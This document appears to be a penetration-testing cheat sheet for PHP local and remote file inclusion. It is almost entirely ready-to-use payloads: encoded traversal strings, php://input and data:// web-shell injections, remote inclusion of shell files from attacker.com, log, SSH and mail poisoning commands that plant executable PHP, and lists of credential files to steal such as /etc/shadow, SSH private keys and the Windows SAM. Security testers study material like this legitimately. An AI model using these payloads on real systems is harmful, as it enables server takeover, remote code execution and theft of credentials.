# File Inclusion (LFI/RFI)

## Description
File Inclusion vulnerabilities allow attackers to include files on a server through the web browser. Local File Inclusion (LFI) includes files from the local server, while Remote File Inclusion (RFI) includes files from external servers. These can lead to information disclosure, code execution, and full server compromise.

## Difference: Path Traversal vs File Inclusion

| Path Traversal | File Inclusion |
|----------------|----------------|
| Reads file content | Executes/processes file |
| Output shown directly | File is interpreted by server |
| `readfile()`, `file_get_contents()` | `include()`, `require()` |

## Basic LFI Payloads

### Standard Traversal
```
?page=../../../etc/passwd
?page=....//....//....//etc/passwd
?page=..%252f..%252f..%252fetc/passwd
```

### Null Byte (PHP < 5.3.4)
```
?page=../../../etc/passwd%00
?page=../../../etc/passwd%00.php
?page=../../../etc/passwd%00.jpg
```

### Path Truncation (PHP < 5.3)
```
# Using . characters (4096 char limit)
?page=../../../etc/passwd............[continues to 4096 chars]

# Using /. combination
?page=../../../etc/passwd/./././././.[continues]
```

## Encoding Bypasses

### URL Encoding
```
?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### Double URL Encoding
```
?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### UTF-8 Encoding
```
?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

### Unicode Encoding
```
?page=..%c0%af..%c0%af..%c0%afetc/passwd
```

## PHP Wrappers

### php://filter - Read Source Code
```
# Base64 encode source
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://filter/convert.base64-encode/resource=config.php

# ROT13 encoding
?page=php://filter/read=string.rot13/resource=index.php

# Multiple filters
?page=php://filter/string.toupper|string.rot13/resource=index.php

# Compression
?page=php://filter/zlib.deflate/convert.base64-encode/resource=index.php
```

### php://input - POST Data as Code
```http
POST /page.php?file=php://input HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

<?php system($_GET['cmd']); ?>
```

### data:// - Inline Data
```
# Base64 encoded PHP
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# Plain text
?page=data://text/plain,<?php system($_GET['cmd']); ?>
```

### expect:// - Command Execution
```
# Requires expect extension
?page=expect://id
?page=expect://whoami
```

### zip:// - Zip Archive
```
# Create zip with PHP file inside
zip shell.zip shell.php

# Upload and include
?page=zip://uploads/shell.zip%23shell.php
```

### phar:// - PHP Archive
```
# Create phar with PHP inside
# Then include via:
?page=phar://uploads/shell.phar/shell.php
```

## Remote File Inclusion (RFI)

**Requirements:**
- `allow_url_include = On`
- `allow_url_fopen = On`

### Basic RFI
```
?page=http://attacker.com/shell.txt
?page=http://attacker.com/shell.php
```

### Null Byte Bypass
```
?page=http://attacker.com/shell.txt%00
?page=http://attacker.com/shell.txt%00.php
```

### Question Mark Bypass
```
# Append ? to treat rest as query string
?page=http://attacker.com/shell.txt?
?page=http://attacker.com/shell.txt?.php
```

### Hash Bypass
```
?page=http://attacker.com/shell.txt#
```

### PHP Wrapper for RFI
```
?page=php://input
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8%2b&c=id
```

## LFI to RCE Techniques

### 1. Log Poisoning

#### Apache Access Log
```bash
# Inject PHP code via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Include the log
?page=../../../var/log/apache2/access.log&cmd=id

# Alternative log locations
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/httpd/access_log
/var/log/nginx/access.log
/var/log/httpd-access.log
```

#### Apache Error Log
```
# Trigger error with PHP code
?page=<?php system($_GET['cmd']); ?>

# Include error log
?page=../../../var/log/apache2/error.log&cmd=id
```

#### SSH Log (auth.log)
```bash
# Connect with PHP code as username
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# Include auth log
?page=../../../var/log/auth.log&cmd=id
```

#### Mail Log
```bash
# Send email with PHP code
mail -s "<?php system(\$_GET['cmd']); ?>" www-data@target.com < /dev/null

# Include mail log
?page=../../../var/log/mail.log&cmd=id
```

### 2. /proc/self/environ

```
# Inject code via User-Agent header
curl -A "<?php system('id'); ?>" "http://target.com/page.php?file=../../../proc/self/environ"
```

### 3. /proc/self/fd

```
# Find file descriptor containing injected data
?page=../../../proc/self/fd/0
?page=../../../proc/self/fd/1
?page=../../../proc/self/fd/2
# ... continue testing
```

### 4. PHP Session Files

```bash
# Set session variable with PHP code (via parameter or cookie)
# Session file location: /tmp/sess_[PHPSESSID] or /var/lib/php/sessions/

# Include session file
?page=../../../tmp/sess_[YOUR_PHPSESSID]
?page=../../../var/lib/php/sessions/sess_[YOUR_PHPSESSID]
```

### 5. Upload + Include

```bash
# Upload image with PHP code embedded
# Include the uploaded file
?page=../../../uploads/image.jpg
```

### 6. Phpinfo + LFI (Race Condition)

```python
# Race condition: PHP creates temp file during multipart upload
# Include temp file before it's deleted
# Requires finding temp file name from phpinfo()
```

## Tools

### LFISuite
```bash
python lfiSuite.py --url "http://target.com/page.php?file=" --exploit
```

### Kadimus
```bash
./kadimus -u "http://target.com/page.php?file="
```

### fimap
```bash
fimap -u "http://target.com/page.php?file="
```

### LFImap
```bash
python lfimap.py -u "http://target.com/page.php?file=PWN" -a
```

### Manual with ffuf
```bash
ffuf -w lfi-payloads.txt -u "http://target.com/page.php?file=FUZZ" -fs 0
```

## Interesting Files to Read

### Linux
```
/etc/passwd
/etc/shadow (if readable)
/etc/hosts
/etc/hostname
/proc/version
/proc/cmdline
/proc/self/environ
/proc/self/status
/home/[user]/.bash_history
/home/[user]/.ssh/id_rsa
/var/log/apache2/access.log
/var/log/auth.log
```

### Windows
```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\
C:\xampp\apache\conf\httpd.conf
```

### Application-Specific
```
# PHP
/etc/php/7.4/apache2/php.ini
/usr/local/etc/php/php.ini

# Apache
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf

# Nginx
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
```

## Detection Checklist

- [ ] Test basic `../` traversal
- [ ] Test with null byte (`%00`)
- [ ] Test URL encoding variations
- [ ] Test double encoding
- [ ] Test PHP wrappers (filter, input, data)
- [ ] Test log file inclusion
- [ ] Test session file inclusion
- [ ] Test /proc/self/environ
- [ ] Test for RFI if applicable

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
- https://highon.coffee/blog/lfi-cheat-sheet/
